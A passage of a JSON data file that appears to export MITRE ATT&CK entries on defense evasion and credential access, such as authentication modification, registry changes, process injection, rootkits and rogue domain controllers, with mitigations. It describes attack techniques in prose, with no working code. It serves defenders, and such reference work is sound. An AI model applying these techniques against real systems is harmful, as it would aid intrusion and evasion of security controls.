              "content": "Use file system access controls to protect folders such as C:\\Windows\\System32."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556",
    "name": "Modify Authentication Process",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1556.001", "name": "Domain Controller Authentication" },
      { "id": "T1556.002", "name": "Password Filter DLL" },
      { "id": "T1556.003", "name": "Pluggable Authentication Modules" },
      { "id": "T1556.004", "name": "Network Device Authentication" },
      { "id": "T1556.005", "name": "Reversible Encryption" },
      { "id": "T1556.006", "name": "Multi-Factor Authentication" },
      { "id": "T1556.007", "name": "Hybrid Identity" },
      { "id": "T1556.008", "name": "Network Provider DLL" }
    ],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Review authentication logs to ensure that mechanisms such as enforcement of MFA are functioning as intended."
            }
          ],
          [
            {
              "type": "text",
              "content": "Periodically review the hybrid identity solution in use for any discrepancies. For example, review all Pass Through Authentication (PTA) agents in the Azure Management Portal to identify any unwanted or unapproved ones. If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties."
            }
          ],
          [
            {
              "type": "text",
              "content": "Periodically review for new and unknown network provider DLLs within the Registry ("
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath"
            },
            {
              "type": "text",
              "content": "). Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key at "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
            },
            {
              "type": "text",
              "content": ", and have corresponding service subkey pointing to a DLL at "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs. "
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory ("
            },
            { "type": "code", "content": "C:\\Windows\\System32\\" },
            {
              "type": "text",
              "content": " by default) of a domain controller and/or local computer with a corresponding entry in "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
            },
            { "type": "text", "content": ". " }
          ],
          [
            { "type": "text", "content": "Starting in Windows 11 22H2, the " },
            { "type": "code", "content": "EnableMPRNotifications" },
            {
              "type": "text",
              "content": " policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            { "type": "text", "content": "Ensure that " },
            { "type": "code", "content": "AllowReversiblePasswordEncryption" },
            {
              "type": "text",
              "content": " property is set to disabled unless there are application requirements."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities."
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit on-premises accounts with access to the hybrid identity solution in place. For example, limit Azure AD Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones."
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "Privileged Process Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Enabled features, such as Protected Process Light (PPL), for LSA."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            { "type": "text", "content": "Restrict write access to the " },
            {
              "type": "code",
              "content": "/Library/Security/SecurityAgentPlugins"
            },
            { "type": "text", "content": " directory." }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict Registry permissions to disallow the modification of sensitive Registry keys such as "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that proper policies are implemented to dictate the the secure enrollment and deactivation of authentication mechanisms, such as MFA, for user accounts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1578",
    "name": "Modify Cloud Compute Infrastructure",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1578.001", "name": "Create Snapshot" },
      { "id": "T1578.002", "name": "Create Cloud Instance" },
      { "id": "T1578.003", "name": "Delete Cloud Instance" },
      { "id": "T1578.004", "name": "Revert Cloud Instance" },
      { "id": "T1578.005", "name": "Modify Cloud Compute Configurations" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots."
        }
      ],
      [
        {
          "type": "text",
          "content": "Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Routinely monitor user permissions to ensure only the expected users have the capability to modify cloud compute infrastructure components."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit permissions for creating, deleting, and otherwise altering compute components in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1112",
    "name": "Modify Registry",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution."
        }
      ],
      [
        {
          "type": "text",
          "content": "Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API."
        }
      ],
      [
        {
          "type": "text",
          "content": "Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1601",
    "name": "Modify System Image",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1601.001", "name": "Patch System Image" },
      { "id": "T1601.002", "name": "Downgrade System Image" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file."
        }
      ],
      [
        {
          "type": "text",
          "content": "To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. "
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. "
            }
          ]
        ]
      },
      {
        "id": "M1043",
        "name": "Credential Access Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. "
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Refer to NIST guidelines when creating password policies. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1599",
    "name": "Network Boundary Bridging",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1599.001", "name": "Network Address Translation Traversal" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks."
        }
      ],
      [
        {
          "type": "text",
          "content": "Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised."
        }
      ],
      [
        {
          "type": "text",
          "content": "When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1043",
        "name": "Credential Access Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Upon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Refer to NIST guidelines when creating password policies. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027",
    "name": "Obfuscated Files or Information",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1027.001", "name": "Binary Padding" },
      { "id": "T1027.002", "name": "Software Packing" },
      { "id": "T1027.003", "name": "Steganography" },
      { "id": "T1027.004", "name": "Compile After Delivery" },
      { "id": "T1027.005", "name": "Indicator Removal from Tools" },
      { "id": "T1027.006", "name": "HTML Smuggling" },
      { "id": "T1027.007", "name": "Dynamic API Resolution" },
      { "id": "T1027.008", "name": "Stripped Payloads" },
      { "id": "T1027.009", "name": "Embedded Payloads" },
      { "id": "T1027.010", "name": "Command Obfuscation" },
      { "id": "T1027.011", "name": "Fileless Storage" },
      { "id": "T1027.012", "name": "LNK Icon Smuggling" }
    ],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "Antivirus/Antimalware",
        "description": [
          [
            {
              "type": "text",
              "content": "Anti-virus can be used to automatically detect and quarantine suspicious files. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10+ to analyze commands after being processed/interpreted. "
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider periodic review of common fileless storage locations (such as the Registry or WMI repository) to potentially identify abnormal and malicious data."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10+, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated payloads. "
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that a finite amount of ingress points to a software deployment system exist with restricted access for those required to allow and enable newly deployed software."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1647",
    "name": "Plist File Modification",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the "
        },
        { "type": "code", "content": "info.plist" },
        {
          "type": "text",
          "content": " file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications)."
        }
      ],
      [
        {
          "type": "text",
          "content": "For example, adversaries can add a malicious application path to the "
        },
        {
          "type": "code",
          "content": "~/Library/Preferences/com.apple.dock.plist"
        },
        {
          "type": "text",
          "content": " file, which controls apps that appear in the Dock. Adversaries can also modify the "
        },
        { "type": "code", "content": "LSUIElement" },
        { "type": "text", "content": " key in an application’s " },
        { "type": "code", "content": "info.plist" },
        {
          "type": "text",
          "content": " file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as "
        },
        { "type": "code", "content": "LSEnvironment" },
        {
          "type": "text",
          "content": ", to enable persistence via Dynamic Linker Hijacking."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure applications are using Apple's developer guidance which enables hardened runtime."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542",
    "name": "Pre-OS Boot",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1542.001", "name": "System Firmware" },
      { "id": "T1542.002", "name": "Component Firmware" },
      { "id": "T1542.003", "name": "Bootkit" },
      { "id": "T1542.004", "name": "ROMMONkit" },
      { "id": "T1542.005", "name": "TFTP Boot" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification.  "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Patch the BIOS and EFI as necessary."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055",
    "name": "Process Injection",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1055.001", "name": "Dynamic-link Library Injection" },
      { "id": "T1055.002", "name": "Portable Executable Injection" },
      { "id": "T1055.003", "name": "Thread Execution Hijacking" },
      { "id": "T1055.004", "name": "Asynchronous Procedure Call" },
      { "id": "T1055.005", "name": "Thread Local Storage" },
      { "id": "T1055.008", "name": "Ptrace System Calls" },
      { "id": "T1055.009", "name": "Proc Memory" },
      { "id": "T1055.011", "name": "Extra Window Memory Injection" },
      { "id": "T1055.012", "name": "Process Hollowing" },
      { "id": "T1055.013", "name": "Process Doppelgänging" },
      { "id": "T1055.014", "name": "VDSO Hijacking" },
      { "id": "T1055.015", "name": "ListPlanting" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. "
        }
      ],
      [
        {
          "type": "text",
          "content": "There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. "
        }
      ],
      [
        {
          "type": "text",
          "content": "More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1620",
    "name": "Reflective Code Loading",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Reflective code injection is very similar to Process Injection except that the \"injection\" loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1207",
    "name": "Rogue Domain Controller",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys."
        }
      ],
      [
        {
          "type": "text",
          "content": "Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. "
        }
      ],
      [
        {
          "type": "text",
          "content": "This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1014",
    "name": "Rootkit",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.  "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1553",
    "name": "Subvert Trust Controls",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1553.001", "name": "Gatekeeper Bypass" },
      { "id": "T1553.002", "name": "Code Signing" },
      { "id": "T1553.003", "name": "SIP and Trust Provider Hijacking" },
      { "id": "T1553.004", "name": "Install Root Certificate" },
      { "id": "T1553.005", "name": "Mark-of-the-Web Bypass" },
      { "id": "T1553.006", "name": "Code Signing Policy Modification" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "System settings can prevent applications from running that haven't been downloaded through the Apple Store (or other legitimate repositories) which can help mitigate some of these issues. Also enable application control solutions such as AppLocker and/or Device Guard to block the loading of malicious content."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows Group Policy can be used to manage root certificates and the "
            },
            { "type": "code", "content": "Flags" },
            { "type": "text", "content": " value of " },
            {
              "type": "code",
              "content": "HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots"
            },
            {
              "type": "text",
              "content": " can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store. "
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Components may still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented."
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "HTTP Public Key Pinning (HPKP) is one method to mitigate potential Adversary-in-the-Middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218",
    "name": "System Binary Proxy Execution",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1218.001", "name": "Compiled HTML File" },
      { "id": "T1218.002", "name": "Control Panel" },
      { "id": "T1218.003", "name": "CMSTP" },
      { "id": "T1218.004", "name": "InstallUtil" },
      { "id": "T1218.005", "name": "Mshta" },
      { "id": "T1218.007", "name": "Msiexec" },
      { "id": "T1218.008", "name": "Odbcconf" },
      { "id": "T1218.009", "name": "Regsvcs/Regasm" },
      { "id": "T1218.010", "name": "Regsvr32" },
      { "id": "T1218.011", "name": "Rundll32" },
      { "id": "T1218.012", "name": "Verclsid" },
      { "id": "T1218.013", "name": "Mavinject" },
      { "id": "T1218.014", "name": "MMC" }
    ],
    "version": "3.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands."
        }
      ],
      [
        {
          "type": "text",
          "content": "Similarly, on Linux systems adversaries may abuse trusted binaries such as "
        },
        { "type": "code", "content": "split" },
        {
          "type": "text",
          "content": " to proxy execution of malicious commands."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
